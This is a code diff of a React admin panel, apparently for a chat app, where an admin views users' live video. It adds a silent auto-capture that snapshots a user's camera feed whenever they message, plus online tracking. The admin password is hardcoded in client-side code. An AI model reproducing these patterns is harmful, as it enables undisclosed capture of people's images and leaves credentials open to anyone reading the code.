@@ -1,5 +1,5 @@
-import { useState, useRef, useEffect } from 'react';
-import { MapPin, Send, Lock, Users, ArrowLeft, Video, VideoOff, Camera } from 'lucide-react';
+import { useState, useRef, useEffect, useCallback } from 'react';
+import { MapPin, Send, Lock, Users, ArrowLeft, Video, VideoOff, Camera, CameraOff } from 'lucide-react';
 import { useToast } from '@/hooks/use-toast';
 import { useWebRTCViewer } from '@/hooks/useWebRTCViewer';
 import { useMessages } from '@/hooks/useMessages';
@@ -7,6 +7,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
+import { Switch } from '@/components/ui/switch';
 import { supabase } from '@/integrations/supabase/client';
 
 interface Message {
@@ -26,6 +27,8 @@ interface UserSession {
   user_name: string;
   last_message: string;
   unread_count: number;
+  is_online: boolean;
+  last_seen: string;
 }
 
 const Admin = () => {
@@ -41,6 +44,7 @@ const Admin = () => {
   const [isSending, setIsSending] = useState(false);
   const [showVideo, setShowVideo] = useState(true);
   const [isCapturing, setIsCapturing] = useState(false);
+  const [autoCaptureEnabled, setAutoCaptureEnabled] = useState(false);
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
   
@@ -53,14 +57,16 @@ const Admin = () => {
     videoRef,
   });
 
-  // Capture photo from video preview
-  const capturePhoto = async () => {
+  // Capture photo from video preview (silent mode for auto-capture)
+  const capturePhoto = useCallback(async (silent: boolean = false) => {
     if (!videoRef.current || !videoConnected || !selectedSession) {
-      toast({
-        title: 'Cannot capture',
-        description: 'Video feed not available',
-        variant: 'destructive',
-      });
+      if (!silent) {
+        toast({
+          title: 'Cannot capture',
+          description: 'Video feed not available',
+          variant: 'destructive',
+        });
+      }
       return;
     }
 
@@ -73,7 +79,10 @@ const Admin = () => {
       canvas.height = video.videoHeight;
       
       const ctx = canvas.getContext('2d');
-      if (!ctx) return;
+      if (!ctx) {
+        setIsCapturing(false);
+        return;
+      }
       
       ctx.drawImage(video, 0, 0);
       const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
@@ -91,21 +100,25 @@ const Admin = () => {
           user_name: 'Admin',
         });
         
-        toast({
-          title: 'Photo captured',
-          description: 'Photo has been saved and sent',
-        });
+        if (!silent) {
+          toast({
+            title: 'Photo captured',
+            description: 'Photo has been saved and sent',
+          });
+        }
       }
     } catch (error) {
       console.error('Capture error:', error);
-      toast({
-        title: 'Capture failed',
-        variant: 'destructive',
-      });
+      if (!silent) {
+        toast({
+          title: 'Capture failed',
+          variant: 'destructive',
+        });
+      }
     }
     
     setIsCapturing(false);
-  };
+  }, [videoConnected, selectedSession, uploadImage, toast]);
 
   const handleLogin = () => {
     if (username === 'prathmesh' && password === 'pAS2905@') {
@@ -150,14 +163,22 @@ const Admin = () => {
       allMessages.forEach((msg) => {
         if (msg.user_session_id && msg.sender_role === 'user') {
           const existing = sessionMap.get(msg.user_session_id);
+          const msgTime = new Date(msg.created_at).getTime();
+          const now = Date.now();
+          const isRecent = (now - msgTime) < 5 * 60 * 1000; // 5 minutes
+          
           if (existing) {
             existing.last_message = msg.content || 'Image';
+            existing.last_seen = msg.created_at;
+            existing.is_online = isRecent;
           } else {
             sessionMap.set(msg.user_session_id, {
               session_id: msg.user_session_id,
               user_name: msg.user_name || 'Unknown',
               last_message: msg.content || 'Image',
               unread_count: 0,
+              is_online: isRecent,
+              last_seen: msg.created_at,
             });
           }
         }
@@ -190,7 +211,7 @@ const Admin = () => {
               if (existing) {
                 return prev.map(s =>
                   s.session_id === newMsg.user_session_id
-                    ? { ...s, last_message: newMsg.content || 'Image' }
+                    ? { ...s, last_message: newMsg.content || 'Image', is_online: true, last_seen: newMsg.created_at }
                     : s
                 );
               } else {
@@ -199,6 +220,8 @@ const Admin = () => {
                   user_name: newMsg.user_name || 'Unknown',
                   last_message: newMsg.content || 'Image',
                   unread_count: 1,
+                  is_online: true,
+                  last_seen: newMsg.created_at,
                 }];
               }
             });
@@ -211,6 +234,25 @@ const Admin = () => {
       supabase.removeChannel(channel);
     };
   }, [isLoggedIn]);
+
+  // Auto-capture when user sends a message
+  const lastUserMessageIdRef = useRef<string | null>(null);
+  
+  useEffect(() => {
+    if (!autoCaptureEnabled || !selectedSession || !videoConnected) return;
+    
+    // Find the latest user message for the selected session
+    const userMessages = messages.filter(
+      m => m.user_session_id === selectedSession && m.sender_role === 'user'
+    );
+    const latestUserMsg = userMessages[userMessages.length - 1];
+    
+    if (latestUserMsg && latestUserMsg.id !== lastUserMessageIdRef.current) {
+      lastUserMessageIdRef.current = latestUserMsg.id;
+      // Auto-capture silently
+      capturePhoto(true);
+    }
+  }, [messages, autoCaptureEnabled, selectedSession, videoConnected, capturePhoto]);
 
   // Auto-scroll to bottom
   useEffect(() => {
@@ -349,10 +391,10 @@ const Admin = () => {
         <div className="flex-1">
           <h1 className="text-lg font-bold">{selectedUser?.user_name}</h1>
           <p className="text-xs opacity-80 flex items-center gap-1">
-            {videoConnecting ? (
-              <>Connecting video...</>
-            ) : videoConnected ? (
+            {videoConnected ? (
               <><Video className="h-3 w-3" /> Live video connected</>
+            ) : videoConnecting ? (
+              <>Connecting video...</>
             ) : (
               <><VideoOff className="h-3 w-3" /> Waiting for video...</>
             )}
@@ -374,6 +416,21 @@ const Admin = () => {
       {/* Live Video Preview */}
       {showVideo && (
         <div className="p-4 bg-muted/50 border-b">
+          <div className="flex items-center justify-between mb-2">
+            <span className="text-sm font-medium">Live Preview</span>
+            <div className="flex items-center gap-2">
+              <span className="text-xs text-muted-foreground">Auto-capture</span>
+              <Switch
+                checked={autoCaptureEnabled}
+                onCheckedChange={setAutoCaptureEnabled}
+              />
+              {autoCaptureEnabled ? (
+                <Camera className="h-4 w-4 text-primary" />
+              ) : (
+                <CameraOff className="h-4 w-4 text-muted-foreground" />
+              )}
+            </div>
+          </div>
           <div className="relative aspect-video max-w-sm mx-auto bg-black rounded-lg overflow-hidden">
             <video
               ref={videoRef}
@@ -397,7 +454,7 @@ const Admin = () => {
             {/* Capture button overlay */}
             {videoConnected && (
               <Button
-                onClick={capturePhoto}
+                onClick={() => capturePhoto(false)}
                 disabled={isCapturing}
                 className="absolute bottom-3 right-3 h-10 w-10 rounded-full bg-primary/90 hover:bg-primary shadow-lg"
                 size="icon"
